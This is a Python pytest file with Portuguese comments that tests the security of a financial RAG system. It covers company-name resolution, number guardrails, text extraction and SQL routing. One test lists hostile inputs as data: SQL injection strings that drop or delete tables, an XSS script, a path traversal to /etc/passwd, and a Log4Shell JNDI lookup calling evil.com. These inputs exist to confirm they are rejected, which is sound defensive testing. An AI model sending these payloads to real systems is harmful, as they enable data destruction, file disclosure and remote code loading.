"""Testes de segurança.

Cobre injeção SQL, prompt injection, validação de entrada, sanitização de nomes
de empresa, proteção contra traversal e execução de código não intencional.
"""
from __future__ import annotations

import pytest

from finllm.rag.entities import resolve_empresa, find_in_text, norm
from finllm.rag.guardrails import validate_numbers, numbers_in, parse_number
from finllm.rag.sql_direct import _conta_da_pergunta, tentar_resposta_direta
from finllm.rag.text import extract_text


class _FakeCursor:
    def __init__(self, rows=None):
        self.rows = rows or []
        self.executed = []

    def __enter__(self):
        return self

    def __exit__(self, *a):
        return False

    def execute(self, q, args=None):
        self.executed.append((q, args))

    def fetchone(self):
        if self.rows:
            return self.rows.pop(0)
        return None

    def fetchall(self):
        rows = self.rows
        self.rows = []
        return rows


class _FakeConn:
    def __init__(self, cur):
        self.cur = cur

    def cursor(self):
        return self.cur

    def commit(self):
        pass

    def __enter__(self):
        return self

    def __exit__(self, *a):
        return False


# ---------------- Segurança: injeção SQL / nomes maliciosos ----------------
def test_seguranca_nome_empresa_injecao_sql():
    """Nomes com aspas, ponto-e-vírgula ou UNION não devem quebrar a resolução."""
    conn = _FakeConn(_FakeCursor([(9512, "PETRÓLEO BRASILEIRO S.A. - PETROBRAS")]))
    # Tentativa de injeção via nome
    nomes_maliciosos = [
        "'; DROP TABLE empresas; --",
        "PETROBRAS' OR 1=1 --",
        "PETROBRAS; DELETE FROM demonstracoes",
        "<script>alert('xss')</script>",
        "../../etc/passwd",
        "${jndi:ldap://evil.com/a}",
    ]
    for n in nomes_maliciosos:
        # Não deve lançar exceção não tratada; deve retornar None ou lançar ValueError controlado
        try:
            resultado = find_in_text(conn, n)
            assert resultado is None or isinstance(resultado, int)
        except ValueError:
            # ValueError é aceitável (nome não encontrado)
            pass


def test_seguranca_resolve_empresa_seguro():
    conn = _FakeConn(_FakeCursor([(9512, "PETRÓLEO BRASILEIRO S.A. - PETROBRAS"),
                                   (4170, "VALE S.A.")]))
    cd, denom = resolve_empresa(conn, "PETROBRAS")
    assert cd == 9512
    # Nome com caracteres perigosos deve falhar com ValueError, não executar SQL bruto
    with pytest.raises(ValueError):
        resolve_empresa(conn, "'; DROP TABLE empresas; --")


# ---------------- Segurança: prompt injection via guardrails ----------------
def test_seguranca_guardrails_bloqueia_numero_inventado():
    ctx = ["3.01 | Receita | 511.994.000"]
    # Número ausente do contexto
    v = validate_numbers("A receita foi 999.999.999 [1].", ctx)
    assert not v.ok
    assert 999999999.0 in v.unsupported


def test_seguranca_guardrails_permite_numero_valido():
    ctx = ["3.01 | Receita | 511.994.000"]
    v = validate_numbers("A receita foi 511.994.000 [1].", ctx)
    assert v.ok


def test_seguranca_guardrails_ignore_anos():
    ctx = ["x | 1.000"]
    v = validate_numbers("Em 2024, o valor foi 1.000 [1].", ctx)
    assert v.ok


# ---------------- Segurança: extração de texto perigosa ----------------
def test_seguranca_extract_pdf_vazio():
    texto, fmt = extract_text(b"")
    assert texto is None or texto == ""
    assert fmt in ("pdf", "text", "zip", "html")


def test_seguranca_extract_zip_marcado_ignorar():
    # ZIPs são tratados como não utilizáveis (sem texto)
    texto, fmt = extract_text(b"PK\x03\x04" + b"\x00" * 100)
    assert texto is None
    assert fmt == "zip"


# ---------------- Segurança: SQL direto não expõe contas desconhecidas ----------------
def test_seguranca_sql_conta_desconhecida():
    assert _conta_da_pergunta("Qual o valor de XYZABC123?") is None
    assert _conta_da_pergunta("DROP TABLE demonstracoes") is None
    assert _conta_da_pergunta("SELECT * FROM usuarios") is None


def test_seguranca_tentar_resposta_direta_sem_cd_cvm():
    assert tentar_resposta_direta("Qual a receita da WEG em 2023?", None) is None


# ---------------- Segurança: parse de números não estoura ----------------
def test_seguranca_parse_numero_malformado():
    assert parse_number("abc") is None
    assert parse_number("") is None
    assert parse_number("1.2.3.4") is None  # múltiplos pontos
    assert parse_number("--12") is None


def test_seguranca_numbers_in_ignora_citacoes():
    # Citações [n] não devem ser interpretadas como números
    assert numbers_in("valor 1.000 [12] [99]") == [1000.0]
    assert numbers_in("[]") == []
